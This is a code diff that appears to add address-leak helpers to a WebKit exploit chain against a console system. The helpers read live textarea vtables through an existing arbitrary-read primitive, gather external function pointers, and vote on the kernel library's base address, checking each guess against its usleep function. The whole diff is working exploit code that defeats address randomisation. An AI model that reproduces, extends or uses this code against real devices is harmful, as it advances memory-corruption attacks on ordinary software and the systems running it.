@@ -348,6 +348,223 @@ export function resolveExtListVote(p, extHexList, off, webkitBase, opts) {
     return null;
 }
 
+const WEBKIT_CODE_PROLOGUE = 0xe5894855;
+
+function extEntryFnPtr(entry) {
+    if (!entry) return null;
+    if (typeof entry === "string")
+        return parseAddrSync(entry.replace(/^0x/i, ""));
+    const raw = entry.ptr || entry.hex || "";
+    return parseAddrSync(String(raw).replace(/^0x/i, ""));
+}
+
+function extEntryCodeNum(entry) {
+    if (!entry || entry.code == null || entry.code === "?") return null;
+    const s = String(entry.code).replace(/^0x/i, "").toLowerCase();
+    const n = parseInt(s, 16);
+    return Number.isFinite(n) ? (n >>> 0) : null;
+}
+
+/** Live textarea/expm1 vtables → external code pointers (skips webkit interior). */
+export function collectLiveVtableExtPtrs(p, webkitBase, off, opts) {
+    opts = opts || {};
+    const maxIdx = opts.vtableEntries != null ? opts.vtableEntries : 48;
+    const out = [];
+    const seen = new Set();
+
+    function add(label, fnPtr, code) {
+        if (!fnPtr || !plausibleExtPtr(fnPtr, webkitBase, off)) return;
+        if (code === WEBKIT_CODE_PROLOGUE) return;
+        const k = String(fnPtr);
+        if (seen.has(k)) return;
+        seen.add(k);
+        out.push({
+            label: label,
+            ptr: k,
+            hex: ptrBig(fnPtr).toString(16),
+            code: code != null ? fmtMagic(code) : null,
+        });
+    }
+
+    const disc = discoverTextareaVtables(p, opts);
+    for (let vi = 0; vi < disc.vtables.length; vi++) {
+        const vt = disc.vtables[vi];
+        for (let i = 0; i < maxIdx; i++) {
+            const fnPtr = read8p(p, vt.vtable.add32(i * 8));
+            if (!fnPtr) continue;
+            const code = read4p(p, fnPtr);
+            if (code == null) continue;
+            add(vt.label + "[" + i + "]", fnPtr, code >>> 0);
+        }
+    }
+    return {
+        entries: out,
+        cells: disc.cells,
+        vtables: disc.vtables.length,
+        cellDbg: disc.cellDbg,
+    };
+}
+
+/**
+ * Auto-resolve libkernel from a list of ext fn ptrs.
+ * 1) Suchi RVA subtract + vote (0 reads)
+ * 2) SCE/ELF header vote below ptrs (resolveExtListVote)
+ * 3) Per-ptr lite resolve + usleep verify (bounded reads)
+ */
+export function resolveLibkernelFromExtList(p, webkitBase, off, entries, opts) {
+    opts = opts || {};
+    off = off || {};
+    if (!p || !entries || !entries.length) {
+        return { ok: false, error: "no ext ptrs", tried: 0 };
+    }
+
+    const minVotes = opts.minVotes != null ? opts.minVotes : 1;
+    const doVerify = opts.verify !== false;
+    const lkVotes = new Map();
+    const hexList = [];
+    let skipped = 0;
+    let tried = 0;
+
+    for (let ei = 0; ei < entries.length; ei++) {
+        const entry = entries[ei];
+        const code = extEntryCodeNum(entry);
+        if (code === WEBKIT_CODE_PROLOGUE) {
+            skipped++;
+            continue;
+        }
+        const fnPtr = extEntryFnPtr(entry);
+        if (!fnPtr || !plausibleExtPtr(fnPtr, webkitBase, off)) {
+            skipped++;
+            continue;
+        }
+        tried++;
+        hexList.push(ptrBig(fnPtr).toString(16));
+
+        const zeros = calcLkFromFnPtrZeroRead(fnPtr, off);
+        for (let zi = 0; zi < zeros.length; zi++) {
+            const z = zeros[zi];
+            const key = String(z.lk);
+            let ent = lkVotes.get(key);
+            if (!ent) {
+                ent = {
+                    lk: z.lk,
+                    count: 0,
+                    vias: [],
+                    refs: [],
+                };
+                lkVotes.set(key, ent);
+            }
+            ent.count++;
+            if (ent.vias.indexOf(z.via) < 0 && ent.vias.length < 4)
+                ent.vias.push(z.via);
+            const ref = (entry.label || "ext") + ":" + ptrBig(fnPtr).toString(16).slice(-8);
+            if (ent.refs.length < 6)
+                ent.refs.push(ref);
+        }
+    }
+
+    const zeroRank = [];
+    lkVotes.forEach(function (ent) {
+        zeroRank.push(ent);
+    });
+    zeroRank.sort(function (a, b) {
+        return b.count - a.count || a.vias.length - b.vias.length;
+    });
+
+    for (let ri = 0; ri < zeroRank.length; ri++) {
+        const cand = zeroRank[ri];
+        if (cand.count < minVotes) continue;
+        if (doVerify) {
+            const v = verifyLibkernelUsleep1352(p, cand.lk, off);
+            if (!v.ok) continue;
+            return {
+                ok: true,
+                lk: cand.lk,
+                via: "zero-vote+" + cand.count + "+" + (cand.vias[0] || "?"),
+                method: "zero-vote",
+                vote: cand.count,
+                rank: ri,
+                tried: tried,
+                skipped: skipped,
+                zeroRank: zeroRank.slice(0, 4),
+            };
+        }
+        return {
+            ok: true,
+            lk: cand.lk,
+            via: "zero-vote+" + cand.count + "+" + (cand.vias[0] || "?"),
+            method: "zero-vote",
+            vote: cand.count,
+            rank: ri,
+            tried: tried,
+            skipped: skipped,
+            zeroRank: zeroRank.slice(0, 4),
+        };
+    }
+
+    if (hexList.length) {
+        const voteOpts = Object.assign({}, opts);
+        const voted = resolveExtListVote(p, hexList, off, webkitBase, voteOpts);
+        if (voted && voted.lk) {
+            if (doVerify) {
+                const vu = verifyLibkernelUsleep1352(p, voted.lk, off);
+                if (vu.ok) {
+                    return Object.assign({
+                        ok: true,
+                        method: "header-vote",
+                        tried: tried,
+                        skipped: skipped,
+                        zeroRank: zeroRank.slice(0, 4),
+                        voteRank: voteOpts._voteRank || [],
+                    }, voted);
+                }
+            } else {
+                return Object.assign({
+                    ok: true,
+                    method: "header-vote",
+                    tried: tried,
+                    skipped: skipped,
+                }, voted);
+            }
+        }
+    }
+
+    for (let ei = 0; ei < entries.length; ei++) {
+        const fnPtr = extEntryFnPtr(entries[ei]);
+        if (!fnPtr || !plausibleExtPtr(fnPtr, webkitBase, off)) continue;
+        const hit = resolveExtPtrToLibkernel(p, fnPtr, off, webkitBase, null, {
+            lite: true,
+            maxWalkPages: 0,
+            zeroReadOnly: false,
+        });
+        if (!hit || !hit.lk) continue;
+        if (doVerify) {
+            const v = verifyLibkernelUsleep1352(p, hit.lk, off);
+            if (!v.ok) continue;
+        }
+        return {
+            ok: true,
+            lk: hit.lk,
+            iatRva: hit.iatRva,
+            via: hit.via,
+            method: "ext-resolve",
+            fnPtr: String(fnPtr),
+            label: entries[ei].label || "?",
+            tried: tried,
+            skipped: skipped,
+            zeroRank: zeroRank.slice(0, 4),
+        };
+    }
+
+    return {
+        ok: false,
+        error: "no lk from " + tried + " ext ptrs (skipped " + skipped + ")",
+        tried: tried,
+        skipped: skipped,
+        zeroRank: zeroRank.slice(0, 6),
+    };
+}
+
 /** ≤6 reads — webkit-relative libkernel guesses (below webkit, 16KB-aligned). */
 export function tryWebkitNearLibkernel(p, webkitBase, off) {
     if (!p || !webkitBase) return null;
